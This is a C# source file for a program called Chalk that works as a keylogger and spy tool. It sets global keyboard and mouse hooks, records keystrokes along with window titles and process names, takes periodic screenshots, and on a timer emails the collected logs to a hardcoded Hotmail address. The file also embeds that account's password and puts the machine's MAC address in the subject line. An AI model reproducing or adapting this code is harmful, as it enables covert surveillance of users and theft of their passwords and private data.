using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Windows.Forms;
using System.Xml;

namespace Dragonfly.Chalk
{
    internal class ChalkApplication : IDisposable
    {
        private enum LogType { KeyPress, Mouse };

        private UserActivityHook globalHooks;
        private System.Windows.Forms.Timer timerDrawScreen;
        private System.Windows.Forms.Timer timerMail;
        private string logsPath;
        private string sSettingsFileName;

        private IntPtr windowPrevHandle = IntPtr.Zero;

        private bool allowKeyHook = true;
        private bool allowMouseHook = false;
        private List<string> keyExcludeList = new List<string>();
        private List<string> mouseIncludeList = new List<string>();

        private bool allowDrawScreen = true;
        private int secondsDrawScreen = 300;

        private bool allowSendMail = true;
        private int secondsProcessMail = 1200;
        private string mail_account = "abc_111_999@hotmail.com";
        private string mail_password = "1QazxsW23Edc";
        private string mail_from = "abc_111_999@hotmail.com";
        private string mail_to = "abc_111_999@hotmail.com";
        private string mail_subject = "chalk";
        private string mail_body = "chalk";
        private string mail_host = "smtp.live.com";
        private int mail_port = 25;
        private bool mail_ssl = true;

        public ChalkApplication()
        {
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            logsPath = appDataPath + "\\logs\\";
            FileUtils.CreateDirectory(logsPath);

            this.sSettingsFileName = logsPath + "settings.xml";
            XmlDocument xmlDocument = XmlHelper.Load(sSettingsFileName);
            if (xmlDocument != null)
            {
                XmlNode node = xmlDocument.SelectSingleNode("/Settings/Log");
                this.allowKeyHook = XmlHelper.GetParamValue(node, "AllowKeyHook", this.allowKeyHook);
                this.allowMouseHook = XmlHelper.GetParamValue(node, "AllowMouseHook", this.allowMouseHook);
                this.allowDrawScreen = XmlHelper.GetParamValue(node, "AllowDrawScreen", this.allowDrawScreen);
                this.secondsDrawScreen = XmlHelper.GetParamValue(node, "SecondsDrawScreen", this.secondsDrawScreen);

                XmlNode mailNode = xmlDocument.SelectSingleNode("/Settings/Mail");
                this.allowSendMail = XmlHelper.GetParamValue(mailNode, "AllowSendMail", this.allowSendMail);
                this.secondsProcessMail = XmlHelper.GetParamValue(mailNode, "SecondsProcessMail", this.secondsProcessMail);
                this.mail_account = XmlHelper.GetParamValue(mailNode, "account", this.mail_account);
                this.mail_password = XmlHelper.GetParamValue(mailNode, "password", this.mail_password);
                this.mail_from = XmlHelper.GetParamValue(mailNode, "from", this.mail_from);
                this.mail_to = XmlHelper.GetParamValue(mailNode, "to", this.mail_to);
                this.mail_host = XmlHelper.GetParamValue(mailNode, "host", this.mail_host);
                this.mail_port = XmlHelper.GetParamValue(mailNode, "port", this.mail_port);
                this.mail_ssl = XmlHelper.GetParamValue(mailNode, "ssl", this.mail_ssl);

                XmlNodeList xmlKeyExcludeList = xmlDocument.SelectNodes("/Settings/KeyHookExclude/Item");
                foreach (XmlNode xmlNode in xmlKeyExcludeList)
                {
                    keyExcludeList.Add(XmlHelper.GetAttributeValue(xmlNode, "title"));
                }
                XmlNodeList xmlMouseIncludeList = xmlDocument.SelectNodes("/Settings/MouseHookInclude/Item");
                foreach (XmlNode xmlNode in xmlMouseIncludeList)
                {
                    mouseIncludeList.Add(XmlHelper.GetAttributeValue(xmlNode, "title"));
                }
            }
            this.mail_subject = "Chalk " + NetworkUtils.GetNetCardMAC();

            globalHooks = new UserActivityHook(this.allowMouseHook, this.allowKeyHook);
            globalHooks.KeyPress += new KeyPressEventHandler(GlobalHooks_KeyPress);
            globalHooks.OnMouseActivity += new MouseEventHandler(globalHooks_OnMouseActivity);

            this.timerDrawScreen = new System.Windows.Forms.Timer();
            this.timerDrawScreen.Interval = secondsDrawScreen * 1000;
            this.timerDrawScreen.Tick += new System.EventHandler(this.timerDrawScreen_Tick);

            this.timerMail = new System.Windows.Forms.Timer();
            this.timerMail.Interval = secondsProcessMail * 1000;
            this.timerMail.Tick += new System.EventHandler(this.timerMail_Tick);
        }

        private void GlobalHooks_KeyPress(object sender, KeyPressEventArgs e)
        {
            string key = ConvertKeyCode(e.KeyChar);

            if (!string.IsNullOrEmpty(key))
            {
                IntPtr foregroundWindowHandle = WindowUtils.GetForegroundWindow();
                bool isAllowedByTitleAndFileNameFilter;
                string titleAndFileName = GetTitleAndFileName(foregroundWindowHandle, LogType.KeyPress, out isAllowedByTitleAndFileNameFilter);
                if (!isAllowedByTitleAndFileNameFilter)
                    return;

                Logger.log(key, titleAndFileName);
            }
        }

        private void globalHooks_OnMouseActivity(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left && e.Clicks >= 1)
            {
                IntPtr foregroundWindowHandle = WindowUtils.GetForegroundWindow();
                bool isAllowedByTitleAndFileNameFilter;
                string titleAndFileName = GetTitleAndFileName(foregroundWindowHandle, LogType.Mouse, out isAllowedByTitleAndFileNameFilter);
                if (!isAllowedByTitleAndFileNameFilter)
                    return;

                Logger.logScreen(e.Location, e.Clicks, titleAndFileName);
            }
        }

        private void timerDrawScreen_Tick(object sender, EventArgs e)
        {
            if (allowDrawScreen)
            {
                Logger.logScreen();
            }
        }

        private void timerMail_Tick(object sender, EventArgs e)
        {
            if (NetworkUtils.IsNetworkConnected())
            {
                if (allowSendMail && (!SendMail.IsBusy()))
                {
                    string sNeedToSendPath = Logger.ConfigNextNeedToSendPath();
                    if (string.IsNullOrEmpty(sNeedToSendPath))
                        return;

                    SendMail.SendPathToGmail(Logger.LogFilePath, sNeedToSendPath, mail_account, mail_password, mail_from, mail_to,
                        mail_subject, mail_body, mail_host, mail_port, mail_ssl);
                }

            }
        }

        private static string ConvertKeyCode(char Key)
        {
            String keyString = Key.ToString();
            if (Key == '\r')
            {
                keyString = "\r\n";
            }


            return keyString;
        }

        private bool IsAllowedByTitleAndFileNameFilter(LogType type, string windowsTitleAndFilename)
        {
            if (type == LogType.KeyPress)
            {
                foreach (string data in this.keyExcludeList)
                {
                    if (windowsTitleAndFilename.Contains(data))
                    {
                        return false;
                    }
                }
                return true;
            }
            else if (type == LogType.Mouse)
            {
                foreach (string data in this.mouseIncludeList)
                {
                    if (windowsTitleAndFilename.Contains(data))
                    {
                        return true;
                    }
                }
                return false;
            }
            else
                return false;

        }

        private string GetTitleAndFileName(IntPtr handle, LogType type, out bool isAllowedByTitleAndFileNameFilter)
        {
            IntPtr destop = WindowUtils.GetDesktopWindow();
            if (destop == handle)
            {
                isAllowedByTitleAndFileNameFilter = false;
                return "";
            }

            int processId;
            WindowUtils.GetWindowThreadProcessId(handle, out processId);
            Process process = Process.GetProcessById(processId);
            string inputModuleFilename = process.MainModule.FileName;
            string curModuleFilename = Process.GetCurrentProcess().MainModule.FileName;
            if (inputModuleFilename == curModuleFilename)
            {
                isAllowedByTitleAndFileNameFilter = false;
                return "";
            }

            string windowTitle = WindowUtils.GetWindowText(handle);
            if (string.IsNullOrEmpty(windowTitle))
                windowTitle = "[NULL]";

            string titleAndFileName = windowTitle + inputModuleFilename;
            isAllowedByTitleAndFileNameFilter = IsAllowedByTitleAndFileNameFilter(type, titleAndFileName);
            if (!isAllowedByTitleAndFileNameFilter)
                return "";

            if (windowPrevHandle.Equals(handle))
                titleAndFileName = string.Empty;
            else
            {

                windowPrevHandle = handle;

                System.DateTime dt = DateTime.Now;
                string time = dt.ToString("u", DateTimeFormatInfo.InvariantInfo);
                titleAndFileName = time + " " + titleAndFileName;
            }
            return titleAndFileName;
        }


        public void Initialize()
        {

            Logger.LogFilePath = this.logsPath;

            if (allowDrawScreen)
                this.timerDrawScreen.Start();
            else
                this.timerDrawScreen.Stop();

            if (allowSendMail)
                this.timerMail.Start();
            else
                this.timerMail.Stop();

        }

        public void Dispose()
        {
            globalHooks.Stop(this.allowMouseHook, this.allowKeyHook, false);
            timerDrawScreen.Dispose();
            timerMail.Dispose();
        }
    }
}
